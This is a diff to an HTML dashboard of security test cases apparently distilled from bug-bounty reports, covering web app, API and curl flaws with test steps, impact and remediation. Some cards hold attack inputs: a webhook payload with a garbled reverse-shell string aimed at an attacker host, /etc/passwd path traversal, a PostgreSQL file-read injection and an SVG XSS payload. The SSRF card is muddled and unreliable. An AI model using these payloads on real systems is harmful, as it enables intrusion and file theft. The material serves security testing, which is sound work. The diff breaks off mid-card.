@@ -276,7 +276,7 @@
     <section class="top-row">
       <div class="metric">
         <h2>Total Test Cases</h2>
-        <div class="metric-value">14</div>
+        <div class="metric-value">44</div>
       </div>
       <div class="metric">
         <h2>Last Updated</h2>
@@ -288,7 +288,7 @@
       <h2>Category Breakdown</h2>
       
     <div class="analytics-row">
-      <div class="analytics-label">API <span>8</span></div>
+      <div class="analytics-label">Web App <span>20</span></div>
       <div class="analytics-bar">
         <div class="analytics-bar-fill" style="width:100%"></div>
       </div>
@@ -296,17 +296,25 @@
     
 
     <div class="analytics-row">
-      <div class="analytics-label">Web App <span>5</span></div>
+      <div class="analytics-label">API <span>15</span></div>
       <div class="analytics-bar">
-        <div class="analytics-bar-fill" style="width:62%"></div>
+        <div class="analytics-bar-fill" style="width:75%"></div>
       </div>
     </div>
     
 
     <div class="analytics-row">
-      <div class="analytics-label">Network <span>1</span></div>
+      <div class="analytics-label">Uncategorized <span>5</span></div>
       <div class="analytics-bar">
-        <div class="analytics-bar-fill" style="width:12%"></div>
+        <div class="analytics-bar-fill" style="width:25%"></div>
+      </div>
+    </div>
+    
+
+    <div class="analytics-row">
+      <div class="analytics-label">Network <span>4</span></div>
+      <div class="analytics-bar">
+        <div class="analytics-bar-fill" style="width:20%"></div>
       </div>
     </div>
     
@@ -320,10 +328,11 @@
       <div>
         <label for="categoryFilter">Category</label>
         <select id="categoryFilter">
-          <option value="all">All Categories (14)</option>
-          <option value="API">API (8)</option>
-<option value="Web App">Web App (5)</option>
-<option value="Network">Network (1)</option>
+          <option value="all">All Categories (44)</option>
+          <option value="Web App">Web App (20)</option>
+<option value="API">API (15)</option>
+<option value="Uncategorized">Uncategorized (5)</option>
+<option value="Network">Network (4)</option>
         </select>
       </div>
     </section>
@@ -746,6 +755,867 @@
 <p><strong class="section-heading section-impact">Impact:</strong> An attacker can execute arbitrary JavaScript code in the user&#x27;s browser, potentially leading to account compromise or data theft.</p>
 
 <p><strong class="section-heading section-remediation">Remediation:</strong> Implement proper input validation and output encoding to prevent the injection of malicious scripts. Use a Content Security Policy (CSP) to restrict the resources that the browser is allowed to load.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Uncategorized">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Report 2890071 Testcase</span>
+        <span class="card-meta-mini">
+          <span class="badge">Uncategorized</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p>Skipped: The report describes a specific auditing issue within a file-sharing application, which is too feature-specific to be generalised.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Blind SSRF via Webhook URL</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to trick the server into making HTTP requests to arbitrary URLs by manipulating a webhook URL parameter in an export process. This can lead to unauthorized access to internal resources or data exfiltration.  The server blindly forwards requests to attacker-controlled systems.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Send a POST request to the export endpoint with a crafted JSON payload.</li>
+<li>Modify the <code>webhookUrl</code> parameter in the JSON payload to point to an attacker-controlled server.</li>
+<li>The <code>webhookUrl</code> parameter should contain a command to execute on the target server, such as: <code>https://&lt;ATTACKER<em>URL&gt;/sh -i &amp; devtcp&lt;TARGET</em>IP&gt; 9001 0&amp;1</code></li>
+<li>An example payload can be:</li>
+</ol>
+<pre><code>{
+  &quot;id&quot;: 12345,
+  &quot;name&quot;: &quot;test&quot;,
+  &quot;oAuthRequired&quot;: false,
+  &quot;draft&quot;: false,
+  &quot;destination&quot;: &quot;WEBHOOK&quot;,
+  &quot;properties&quot;: {
+    &quot;webhookUrl&quot;: &quot;https://&lt;ATTACKER_URL&gt;/sh -i &amp; devtcp&lt;TARGET_IP&gt; 9001 0&amp;1&quot;,
+    &quot;webhookType&quot;: &quot;CUSTOM&quot;
+  },
+  &quot;public&quot;: false
+}</code></pre>
+<ol>
+<li>Monitor the attacker-controlled server for incoming requests from the target server, confirming the SSRF.  Verify the request contains the command payload.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized access to internal resources, data exfiltration, and potential for further exploitation.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Validate and sanitize all user-supplied URLs. Implement strict access controls and network segmentation to prevent access to sensitive internal resources. Use allowlists for acceptable URLs and block all others.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Calendar Attachment Download</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> Calendar attachments, when presented for download, might expose local files if not properly sanitised. This could allow an attacker to retrieve files from the server&#x27;s filesystem that they should not have access to. Proper validation of file extensions and paths is essential.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Create a calendar entry with an attachment.</li>
+<li>Observe the download link or mechanism for the attachment.</li>
+<li>Attempt to modify the attachment URL to include a path traversal sequence, like <code>&lt;PAYLOAD&gt;</code> (e.g., <code>../../../../etc/passwd</code>).</li>
+<li>Check if the server serves a file from the manipulated path. Example payload: <code>../../../../etc/passwd</code></li>
+<li>Verify the file extension is properly validated and restricted to expected types.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Retrieval of sensitive files from the server&#x27;s filesystem.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict file validation and path sanitisation when handling attachments, particularly when constructing download URLs. Use whitelists for allowed file extensions.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Missing Ownership Check - Cross-Table Column Movement</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows a user to move a column from one table to another table belonging to a different user. This can lead to data modification and potential privilege escalation, as users can manipulate data they should not have access to. The vulnerability arises from a failure to verify ownership during column movement operations.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Log in to the application as User A.</li>
+<li>Create Table A with at least one column.</li>
+<li>Log in to the application as User B.</li>
+<li>Create Table B.</li>
+<li>While logged in as User A, attempt to move a column from Table A to Table B using the application&#x27;s column manipulation interface, or through an API call if one is available.  The request may include parameters like <code>source<em>table</em>id</code>, <code>destination<em>table</em>id</code>, and <code>column<em>id</code>.  Example Payload: <code>source</em>table<em>id=&lt;TABLE</em>A<em>ID&gt;&amp;destination</em>table<em>id=&lt;TABLE</em>B<em>ID&gt;&amp;column</em>id=&lt;COLUMN_ID&gt;</code>.</li>
+<li>Verify if the column movement is successful without proper ownership verification.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized data modification, potential privilege escalation, and compromise of data integrity.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust ownership checks before allowing any data manipulation operations between tables. Ensure users can only interact with tables they own or have explicit permissions to modify.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Metadata Disclosure</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability involves the exposure of sensitive metadata associated with tables, potentially allowing an attacker to gain insights into the structure and internal workings of a data storage system. This information can be used to plan further attacks or bypass security measures. The disclosure of metadata can lead to unauthorized data access or manipulation.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to the tables application at <code>&lt;TARGET_URL&gt;</code>.</li>
+<li>Attempt to access metadata for a table using a crafted URL or API request. This could involve manipulating table names or identifiers in the request. For example: <code>&lt;TARGET<em>URL&gt;/tables/&lt;TABLE</em>NAME&gt;/metadata</code>.</li>
+<li>Observe the response to identify any exposed metadata, such as column names, data types, or other sensitive information. The payload would be a manipulated URL.</li>
+<li>Use the following payload as an example: <code>&lt;TARGET<em>URL&gt;/tables/sensitive</em>table/metadata</code>.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized disclosure of table metadata, leading to potential data exfiltration or manipulation.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement proper access controls to restrict metadata access to authorized users only. Sanitize and validate all user inputs to prevent manipulation of table identifiers.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Blind Poll Draft Deletion</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A user can delete another user’s poll draft without knowing anything about it, only the draft ID. This allows for unauthorized data removal and potential denial of service. The vulnerability arises from a lack of proper authorization checks during the deletion process.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Obtain the ID of a poll draft belonging to another user. This may involve observing network requests or using other vulnerabilities to enumerate IDs.</li>
+<li>Construct a request to delete the poll draft, using the obtained ID in the relevant request parameter. For example: <code>DELETE &lt;TARGET<em>URL&gt;/polls/drafts/&lt;DRAFT</em>ID&gt;</code></li>
+<li>Verify that the poll draft is successfully deleted without authentication or authorization. A successful response might be a 204 No Content status code.</li>
+<li>Observe if the original user is notified or aware of the deletion.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized deletion of poll drafts, potentially leading to data loss and disruption of user workflows.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust authorization checks to ensure that users can only delete their own poll drafts. Validate all input parameters, including IDs, to prevent manipulation. Provide clear feedback to users regarding deletion actions.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Permission Modification via Shared Access</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This issue involves a user with permission to share resources being able to modify the access permissions of other users who are not owners. This bypasses intended access controls, potentially leading to unauthorized access or modification of data. It highlights a flaw in permission management logic.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Ensure user A has permission to share a resource (e.g., a folder or file) with other users.</li>
+<li>Ensure user B is a non-owner user with access to the same resource.</li>
+<li>Using user A’s session, attempt to modify the permissions granted to user B for the shared resource. Example payload: <code>&lt;PAYLOAD&gt;</code> (This would be a request body containing JSON or XML data to modify the access level, e.g., changing read-only access to full write access).</li>
+<li>Verify that the permission change is successful and user B&#x27;s access level is modified without their consent or the owner&#x27;s knowledge.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized access to sensitive data or the ability to modify data belonging to other users.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement stricter access controls to prevent users with sharing permissions from modifying the permissions of other users.  Ensure permission changes require explicit owner approval or follow a least-privilege principle.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Unauthorised Appointment Booking</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> The application allowed users to book appointments without proper authentication or a valid token. This lack of proper authorization could potentially allow an attacker to create appointments on behalf of other users, leading to scheduling conflicts or denial of service. The vulnerability highlights a critical flaw in the application’s access control mechanism.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Send a POST request to the appointment booking endpoint, located at <code>&lt;TARGET_URL&gt;/booking</code>.</li>
+<li>Include the appointment details in the request body, such as the start time, end time, resource ID, and user ID.</li>
+<li>Omit the authentication token or provide an invalid token in the request headers.</li>
+<li>Observe whether the appointment is successfully booked without proper authentication.</li>
+</ol>
+<p>Example Payload: <code>{&quot;start&quot;:&quot;2024-01-01T10:00:00Z&quot;, &quot;end&quot;:&quot;2024-01-01T11:00:00Z&quot;, &quot;resourceId&quot;:&quot;room1&quot;, &quot;userId&quot;:&quot;user2&quot;}</code></p>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker could potentially book appointments on behalf of other users, leading to scheduling conflicts or denial of service.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Always validate user authentication and authorization before allowing any actions that modify data or resources. Ensure that every request includes a valid and properly verified token.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Uncategorized">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Report 3316910 Testcase</span>
+        <span class="card-meta-mini">
+          <span class="badge">Uncategorized</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p>Skipped: The report lacks specific details on how the second-order XSS vulnerability was triggered and exploited.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Unauthorised Share Enumeration</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This issue allows an attacker to enumerate shares in a system without proper authorisation. This can reveal information about the data being shared and potentially lead to unauthorised access. The vulnerability represents a regression from a previously fixed issue.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Send a GET request to <code>&lt;TARGET_URL&gt;/apps/tables/public/shares?id=&lt;PARAMETER&gt;</code> where <code>&lt;PARAMETER&gt;</code> is the ID of a table.</li>
+<li>Observe the response. The response should require authentication, but if the vulnerability exists, shares might be enumerated without authentication.</li>
+<li>Example Payload: <code>/apps/tables/public/shares?id=123</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Information disclosure; potential for unauthorized access.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement proper access controls to prevent unauthenticated users from enumerating shares. Ensure fixes from prior vulnerabilities are correctly implemented and tested.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Uncategorized">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Report 3338748 Testcase</span>
+        <span class="card-meta-mini">
+          <span class="badge">Uncategorized</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p>Skipped: Report describes a feature specific to the Nextcloud application and does not provide generalizable steps or vulnerabilities.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Stored Cross-Site Scripting via SVG Upload</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to inject malicious JavaScript code into a website through an SVG file upload. When other users view the SVG file, the attacker&#x27;s JavaScript executes in their browser context, potentially leading to account compromise or data theft. This is a significant risk as it bypasses typical sanitization measures.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Locate an upload functionality that accepts SVG files on &lt;TARGET_URL&gt;.</li>
+<li>Upload an SVG file containing a malicious JavaScript payload. For example: <code>&lt;svg&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;&lt;/svg&gt;</code>.</li>
+<li>Verify that the SVG file renders correctly and that the injected JavaScript executes when the file is viewed by another user accessing &lt;TARGET<em>URL&gt;/&lt;UPLOADED</em>FILE&gt;.</li>
+<li>Use a browser&#x27;s developer tools to confirm the presence and execution of the JavaScript payload.</li>
+<li>Test with different JavaScript injection techniques and payload obfuscation to assess the effectiveness of input validation and output encoding.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can execute arbitrary JavaScript code in the context of another user&#x27;s browser, potentially leading to session hijacking, account takeover, or defacement.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict input validation on all uploaded files, including SVG files. Sanitize SVG content to remove or encode potentially malicious code. Use output encoding when rendering SVG files to prevent XSS attacks.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Weak Cryptography Defaults in Curl with GnuTLS</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> Curl, when compiled with the GnuTLS backend, may default to weak cryptographic parameters, potentially allowing connections to servers using insecure ciphers. This can increase the risk of man-in-the-middle attacks if a poorly configured server is targeted. This vulnerability exists because the default GnuTLS security level is set to &quot;NORMAL,&quot; which allows the usage of older, less secure algorithms.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Compile Curl with the GnuTLS backend: <code>./configure --with-gnutls; make</code></li>
+<li>Test connections to servers known to use weak configurations: <code>./src/curl https://dh1024.badssl.com/ https://dh-small-subgroup.badssl.com/ https://dh-composite.badssl.com/</code></li>
+<li>Examine the cipher suites used during the connection to confirm that weak algorithms are negotiated. The output can be viewed using the <code>-v</code> or <code>--verbose</code> flag in curl: <code>./src/curl -v &lt;TARGET_URL&gt;</code></li>
+<li>Verify the security level by checking the GnuTLS priority string, aiming to ensure <code>SECURE192</code> is being used as the base level.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker with a poorly configured server can potentially downgrade the encryption strength, enabling them to perform man-in-the-middle attacks and compromise sensitive data.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Configure Curl to use a more secure GnuTLS priority string, such as <code>SECURE192</code>, which enforces stronger ciphers and algorithms. Review and update GnuTLS configuration to ensure it aligns with current security best practices.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">SQL Injection via Filtered Relation</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability occurs when user-supplied data is improperly sanitized and incorporated into a SQL query, allowing an attacker to inject malicious SQL code. The injected code can be used to read sensitive data, modify database content, or even execute arbitrary commands on the database server.  This specifically targets systems using PostgreSQL and its raw string capabilities within SQL queries.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Construct a malicious SQL payload containing PostgreSQL raw string delimiters (e.g., <code>$$</code>) and commands.</li>
+<li>Inject the payload into a user-supplied parameter or field that is incorporated into a SQL query, specifically within the context of a filtered relation annotation.</li>
+<li>Observe if the injected command is executed, demonstrating successful SQL injection.</li>
+</ol>
+
+<p>Example Payload: <code>$a$,$b$,$c$,(1)from(select(1)id,(pg<em>read</em>file($$/etc/passwd$$))title,(3)author<em>id,(4)editor</em>id,(5)number<em>editor,(6)editor</em>number,(7)state)filtered<em>relation</em>book,(select(1),1</code></p>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized access to sensitive data, modification of database records, and potential remote code execution on the database server.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Properly sanitize user input before incorporating it into SQL queries. Escape or filter special characters, and use parameterized queries or prepared statements to prevent SQL injection vulnerabilities.  Ensure that any regular expressions used for filtering user input are comprehensive and account for potential injection vectors.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Economic Denial of Service via Callback Gas Exploitation</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows attackers to manipulate callback mechanisms in inter-chain communication protocols, causing financial harm to relayers and disrupting cross-chain functionality. It exploits a mismatch between the simulated gas cost and the actual gas consumed during callback execution.  This results in a denial of service for applications relying on cross-chain transactions.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Determine the maximum gas limit set for callbacks within the target inter-chain communication protocol&#x27;s configuration.</li>
+<li>Deploy a smart contract that executes computationally expensive operations (e.g., nested loops, hashing algorithms) designed to consume slightly under the determined gas limit (e.g., <code>&lt;GAS<em>LIMIT</em>LESS<em>THAN</em>MAX&gt;</code>). The contract must return a success status.</li>
+<li>Construct an inter-chain message (e.g., <code>MsgTransfer</code>) and include a <code>memo</code> field containing the address of the deployed contract as the callback destination.</li>
+<li>Trigger the relay process and monitor the gas consumption during callback execution. Verify that the simulation passes because the contract returns &quot;success&quot; and the gas consumption is below the limit.</li>
+<li>Repeat the process multiple times to observe the financial impact on the relayer node.</li>
+<li>Example Payload: <code>&lt;PAYLOAD: {&quot;sender&quot;:&quot;&lt;SENDER<em>ADDRESS&gt;&quot;, &quot;receiver&quot;:&quot;&lt;RECEIVER</em>ADDRESS&gt;&quot;, &quot;amount&quot;:1, &quot;memo&quot;:&quot;&lt;CONTRACT_ADDRESS&gt;&quot;}&gt;</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Financial losses for relayers, disruption of cross-chain communication, and potential loss of trust in the underlying protocol.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement stricter gas limit enforcement during callback execution, require senders to specify and pay for callback gas usage, and enhance simulation logic to account for actual gas consumption instead of just success/failure status.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Unsafe JavaScript Execution via Curl</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability arises when a command-line tool like curl, used to fetch data from a server, executes JavaScript code instead of simply displaying or handling it appropriately. This can lead to unexpected behaviour, potential security risks, and denial-of-service scenarios. The problem is more apparent in shells that execute code instead of just outputting it.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Host an endpoint that returns a JavaScript payload, such as <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. For example, <code>ctf.eztfsp.lv:8009/test.js</code>.</li>
+<li>Open a PowerShell terminal.</li>
+<li>Run the following command: <code>curl &lt;TARGET_URL&gt;</code> (e.g., <code>curl ctf.eztfsp.lv:8009/test.js</code>).</li>
+<li>Observe if a JavaScript alert window appears (&quot;message from webpage 1&quot; in the report).</li>
+<li>Try to terminate the curl process using Ctrl+C and note if it hangs.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unexpected JavaScript execution can lead to denial-of-service, potentially harmful script execution, and compromise system integrity.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong>  Ensure command-line tools handle responses as text or data, not as executable code. Properly sanitize or escape any dynamically generated content before serving it, and consider using safer alternatives if code execution is not needed.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">FTP EPSV State Machine Infinite Loop</span>
+        <span class="card-meta-mini">
+          <span class="badge">Network</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> When using EPSV mode with a malicious FTP server that doesn&#x27;t send data after establishing a connection, the curl program enters an infinite loop due to a flawed state machine. This prevents the program from completing the transfer or exiting normally.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Start a malicious FTP server on a network port. This server should establish an EPSV connection but not send any data.  A Python script like the one provided can be used.</li>
+<li>Execute the <code>curl</code> command using EPSV mode to download a file, providing dummy credentials.  For example: <code>./curl -u anonymous:123 &#x27;ftp://&lt;TARGET<em>URL&gt;/test&#x27; -o ./test</code>. Use a test file name like &#x27;test&#x27; and a target URL like <code>&lt;TARGET</em>URL&gt;</code>.</li>
+<li>Observe that the <code>curl</code> program enters an infinite loop and does not complete the transfer or exit.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Denial of service – the <code>curl</code> process becomes unresponsive, consuming resources and preventing further network operations.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Improve the error handling within the state machine to properly detect and recover from situations where data is not received after establishing an EPSV connection. Implement timeouts and checks for expected data to prevent infinite loops.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Heap Buffer Overflow in TFTP Transfer</span>
+        <span class="card-meta-mini">
+          <span class="badge">Network</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A heap buffer overflow can occur when a TFTP server sends an Option Acknowledgment (OACK) packet with a block size exceeding the default, leading to memory corruption and potential remote code execution or denial of service. This vulnerability is due to inadequate buffer reallocation during the block size update.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Configure a TFTP server to send an OACK packet with a <code>blksize</code> option greater than the default (e.g., 2048).</li>
+<li>Use a TFTP client (e.g., <code>curl</code>) to initiate a file transfer from the malicious server: <code>curl tftp://&lt;TARGET_URL&gt;:&lt;PORT&gt;/test</code>.</li>
+<li>Observe if the client application crashes or exhibits unexpected behavior.</li>
+<li>Monitor memory for corruption using debugging tools.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Potential for remote code execution or denial of service due to heap buffer overflow. An attacker could overwrite critical data or function pointers, leading to arbitrary code execution with the privileges of the affected process.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure that when a TFTP server provides a larger block size, the receive and send buffers are reallocated to accommodate the new size. Validate input sizes and allocate sufficient memory to prevent overflows.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Path Traversal in File URI Scheme</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> The <code>file://</code> URI scheme handler fails to properly sanitise directory traversal sequences, enabling an attacker to access arbitrary files on the system. This poses a significant risk when the URI is constructed from untrusted input.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Use a command-line tool like <code>curl</code> or similar to retrieve a file using a <code>file://</code> URI.</li>
+<li>Craft a <code>file://</code> URI containing directory traversal sequences (<code>../</code>) to escape the intended directory.</li>
+<li>Attempt to access sensitive system files, like a password file.</li>
+</ol>
+<pre><code>    curl &quot;file:///any/dummy/path/../../../../../../etc/passwd&quot;</code></pre>
+<ol>
+<li>Observe whether the command successfully retrieves the contents of the intended file, bypassing the intended path.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Arbitrary file read, potentially exposing sensitive configuration files, source code, or system files.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust sanitisation or validation of directory paths when handling <code>file://</code> URIs. Avoid constructing <code>file://</code> URIs directly from user input and implement strict access controls on the filesystem.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Unauthenticated GraphQL Schema Access</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
